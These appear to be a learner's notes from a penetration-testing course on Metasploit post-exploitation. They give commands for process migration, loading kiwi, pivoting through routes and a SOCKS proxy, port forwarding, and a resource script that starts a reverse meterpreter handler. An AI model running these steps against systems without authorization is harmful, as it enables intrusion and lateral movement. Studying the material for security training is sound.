
### Post Explotation
Gather information about the current users last active time `idletime`
Start an hidden process notepad `execute -H -f notepad` -> migrate to PID
Migrate to an more privileged service `migrate <PID>` (`ps`)

### Extensions
After initial exploitation Metasploit modules can be loaded in by using `load <extension>` for example `load kiwi` 

### Pivoting
Adding routes to known sessions. For example, compromised host has another adapter with an private network. We can add this network through:
```
Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
   IPv4 Address. . . . . . . . . . . : 172.16.5.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

Background the session and add the route:
```
bg
*Backgrounding session <1>*

route add 172.16.5.0/24 1
route print

OR 

bg
use multi/manage/autoroute
set sessions <sessiondi>
run

```

Now we can use auxiliary modules again against this new private network:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run

```

It's important to note that the added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as _windows/x64/meterpreter/bind_tcp_, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.


#### Proxies
To make it possible to run applications outside of the Metasploit Framework to run we can use the auxiliary/server/socks_proxy module
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5 
run -j 

vi /etc/proxychains4.conf
socks5 127.0.0.1 1080


### For example run RDP against comprimised machine through metasploit proxy
sudo proxychains xfreerdp /v:<private ip> /u:<username /dynamic-resolution /drive:/tmp

```


### Port forward
We can also use a similar technique for port forwarding using the _portfwd_ command from inside a Meterpreter session, which will forward a specific port to the internal network.

Add a listener on machine 192.168.XX to listen on port 3389 and forward traffic to port 3389 on host 172.16.5.200
meterpreter > `portfwd add -l 3389 -p 3389 -r 172.16.5.200`

#### Resource Scripts
Resource scripts can chain together a series of Metasploit console commands and Ruby code. Meaning, we can either use the built-in commands of Metasploit or write code in _Ruby_[1](https://portal.offsec.com/learning-modules/the-metasploit-framework-45720/automating-metasploit-45767/resource-scripts-45724#fn-local_id_147-1) (as it's the language Metasploit is developed in) to manage control flow as well as develop advanced logic components for resource scripts.

```
// EXAMPLE RESOURCE SCRIPT, start meterpreter and immediatly migrate to newly created proces:

use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443

set AutoRunScript /post/windows/manage/migrate
set ExitOnSession false

run -z -j

```
Start the resource script by: `sudo msfconsole -r listener.rc`

More resource scripts can be found at:
`ls -l /usr/share/metasploit-framework/scripts/resource`



#### Global options
Setting RHOSTS per module can be annoying. To make settings such as RHOSTS and LPORT across all modules we use the global options such as 
`setg` | `unsetg` -> `setg RHOSTS <ip>`

